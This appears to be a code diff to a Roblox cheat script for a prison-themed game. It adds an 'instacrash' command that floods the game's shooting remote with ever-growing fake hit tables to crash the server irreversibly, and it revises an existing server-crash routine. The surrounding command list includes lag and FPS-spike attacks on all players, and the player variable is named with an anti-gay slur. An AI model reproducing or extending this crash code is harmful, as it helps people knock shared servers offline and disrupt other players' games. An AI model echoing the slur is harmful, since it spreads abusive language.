@@ -380,6 +380,7 @@ Cmd[#Cmd + 1] = {Name='lag <duration>',Desc='Lags for an amount of time'}
 Cmd[#Cmd + 1] = {Name='unlag',Desc='Stops lag'}
 Cmd[#Cmd + 1] = {Name='crash / crashserver',Desc='Lags and crashes the server'}
 Cmd[#Cmd + 1] = {Name='uncrash / uncrashserver',Desc="Stops crashing the server"}
+Cmd[#Cmd + 1] = {Name='instacrash / instantcrash',Desc='Crashes the server as fast as possible (This command is irreversible)'}
 Cmd[#Cmd + 1] = {Name='fpslag / lagspike',Desc="Makes all players' FPS decrease (Requires SWAT gamepass)"}
 Cmd[#Cmd + 1] = {Name='unfpslag / unlagspike',Desc='Stops FPS spiking'}
 Cmd[#Cmd + 1] = {Name='infstamina',Desc="Enables infinite stamina"}
@@ -2293,19 +2294,15 @@ local function executeCmd(cmd, args)
 		if not Toggles.CrashServer then
 			log('[ ✅ ]: Crashing server')
 			Toggles.CrashServer = true
-			local event = {}
+			local event = {
+				[1] = {
+					['RayObject'] = Ray.new(Vector3.new(), Vector3.new()), 
+					['Distance'] = 0, 
+					['Cframe'] = CFrame.new(), 
+					['Hit'] = workspace[fag.Name].Head
+				}
+			}
 			repeat
-				spawn(function()
-					repeat
-						event[#event+1] = {
-							['RayObject'] = Ray.new(Vector3.new(), Vector3.new()), 
-							['Distance'] = 0, 
-							['Cframe'] = CFrame.new(), 
-							['Hit'] = workspace[fag.Name].Head
-						}
-						RunService.Heartbeat:Wait()
-					until not Toggles.CrashServer
-				end)
 				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver['Remington 870'].ITEMPICKUP)
 				local tool = fag.Character:FindFirstChild('Remington 870') or fag.Backpack:FindFirstChild('Remington 870')
 				ReplicatedStorage.ShootEvent:FireServer(event, tool)
@@ -2321,6 +2318,28 @@ local function executeCmd(cmd, args)
 			tool.Parent = fag.Character
 			tool:Destroy()
 		else log('[ ❌ ]: Already uncrashing server') end
+	elseif cmd == 'instacrash' or cmd == 'instantcrash' then
+		if not Toggles.InstaCrash then
+			log('[ ✅ ]: Insta-crashing server (This command is irreversible)')
+			Toggles.InstaCrash = true
+			local event = {}
+			repeat
+				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver['Remington 870'].ITEMPICKUP)
+				local tool = fag.Character:FindFirstChild('Remington 870') or fag.Backpack:FindFirstChild('Remington 870')
+				spawn(function()
+					repeat
+						event[#event+1] = {
+							['RayObject'] = Ray.new(Vector3.new(), Vector3.new()), 
+							['Distance'] = 0, 
+							['Cframe'] = CFrame.new(), 
+							['Hit'] = workspace[fag.Name].Head
+						}
+						RunService.Heartbeat:Wait()
+					until not Toggles.CrashServer
+				end)
+				RunService.Heartbeat:Wait()
+			until not Toggles.CrashServer
+		else log('[ ❌ ]: Already insta-crashing server') end
 	elseif cmd == 'fpslag' or cmd == 'lagspike' then
 		if not Toggles.FPSLag then
 			if SWAT then
